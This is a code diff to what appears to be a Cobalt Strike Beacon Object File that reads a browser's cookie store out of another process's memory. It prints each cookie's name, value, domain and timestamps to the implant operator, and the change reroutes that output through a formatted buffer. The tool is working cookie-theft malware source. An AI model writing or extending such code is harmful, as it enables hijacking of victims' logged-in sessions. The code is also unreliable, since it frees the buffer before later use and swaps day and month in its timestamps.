@@ -46,7 +46,7 @@ extern "C" {
         size_t size;
     };
 
-    void ReadString(HANDLE hProcess, OptimizedString string) {
+    void ReadString(HANDLE hProcess, OptimizedString string, formatp* buffer) {
 
         if (string.len > 23) //This is the max size of Short String Optimization (To my knowledge)
         {
@@ -63,16 +63,16 @@ extern "C" {
                     free(buf);
                     return;
                 }
-                BeaconPrintf(CALLBACK_OUTPUT, "%s\n", buf);
+                BeaconFormatPrintf(buffer, "%s\n", buf);
                 free(buf);
             }
         }
         else
-            BeaconPrintf(CALLBACK_OUTPUT, "%s\n", string.buf);
+            BeaconFormatPrintf(buffer, "%s\n", string.buf);
 
     }
 
-    void PrintTimeStamp(int64_t timeStamp) {
+    void PrintTimeStamp(int64_t timeStamp, formatp* buffer) {
         ULONGLONG fileTimeTicks = timeStamp * 10;
 
         FILETIME fileTime;
@@ -82,48 +82,51 @@ extern "C" {
         SYSTEMTIME systemTime;
         FileTimeToSystemTime(&fileTime, &systemTime);
 
-        BeaconPrintf(CALLBACK_OUTPUT, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
+        BeaconFormatPrintf(buffer, "%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
             systemTime.wYear, systemTime.wDay, systemTime.wMonth,
             systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
     }
 
-    void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr) {
+    void ProcessNodeValue(HANDLE hProcess, uintptr_t Valueaddr, formatp* buffer) {
 
         CanonicalCookie cookie = { 0 };
         if (!ReadProcessMemory(hProcess, reinterpret_cast<LPCVOID>(Valueaddr), &cookie, sizeof(CanonicalCookie), nullptr)) {
             BeaconPrintf(CALLBACK_ERROR, "Failed to read cookie struct! Error: %i\n", GetLastError());
         }
-
-        BeaconPrintf(CALLBACK_OUTPUT, "    Name: ");
-        ReadString(hProcess, cookie.name);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Value: ");
-        ReadString(hProcess, cookie.value);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Domain: ");
-        ReadString(hProcess, cookie.domain);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Path: ");
-        ReadString(hProcess, cookie.path);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Creation time: ");
-        PrintTimeStamp(cookie.creation_date);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Expiration time: ");
-        PrintTimeStamp(cookie.expiry_date);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Last accessed: ");
-        PrintTimeStamp(cookie.last_access_date);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Last updated: ");
-        PrintTimeStamp(cookie.last_update_date);
-        BeaconPrintf(CALLBACK_OUTPUT, "    Secure: %s\n", cookie.secure ? "True" : "False");
-        BeaconPrintf(CALLBACK_OUTPUT, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
-
-        BeaconPrintf(CALLBACK_OUTPUT, "\n");
+        BeaconFormatPrintf(buffer, "    Name: ");
+        ReadString(hProcess, cookie.name, buffer);
+        BeaconFormatPrintf(buffer, "    Value: ");
+        ReadString(hProcess, cookie.value, buffer);
+        BeaconFormatPrintf(buffer, "    Domain: ");
+        ReadString(hProcess, cookie.domain, buffer);
+        BeaconFormatPrintf(buffer, "    Path: ");
+        ReadString(hProcess, cookie.path, buffer);
+        BeaconFormatPrintf(buffer, "    Creation time: ");
+        PrintTimeStamp(cookie.creation_date, buffer);
+        BeaconFormatPrintf(buffer, "    Expiration time: ");
+        PrintTimeStamp(cookie.expiry_date, buffer);
+        BeaconFormatPrintf(buffer, "    Last accessed: ");
+        PrintTimeStamp(cookie.last_access_date, buffer);
+        BeaconFormatPrintf(buffer, "    Last updated: ");
+        PrintTimeStamp(cookie.last_update_date, buffer);
+        BeaconFormatPrintf(buffer, "    Secure: %s\n", cookie.secure ? "True" : "False");
+        BeaconFormatPrintf(buffer, "    HttpOnly: %s\n", cookie.httponly ? "True" : "False");
     }
 
     void ProcessNode(HANDLE hProcess, const Node& node) {
+        formatp buffer;
+        BeaconFormatAlloc(&buffer, 1024); //Overkill, but better than underkill?
+
         BeaconPrintf(CALLBACK_OUTPUT, "Cookie Key: ");
-        ReadString(hProcess, node.key);
+        ReadString(hProcess, node.key, &buffer);
+
+        BeaconPrintf(CALLBACK_OUTPUT, "%s\n\n", BeaconFormatToString(&buffer, NULL));
+        BeaconFormatFree(&buffer);
 
 #ifdef _DEBUG
         BeaconPrintf(CALLBACK_OUTPUT, "Attempting to read cookie values from address:  0x%p\n", (void*)node.valueAddress);
 #endif
-        ProcessNodeValue(hProcess, node.valueAddress);
+        ProcessNodeValue(hProcess, node.valueAddress, &buffer);
 
         //Process the left child if it exists
         if (node.left != 0) {
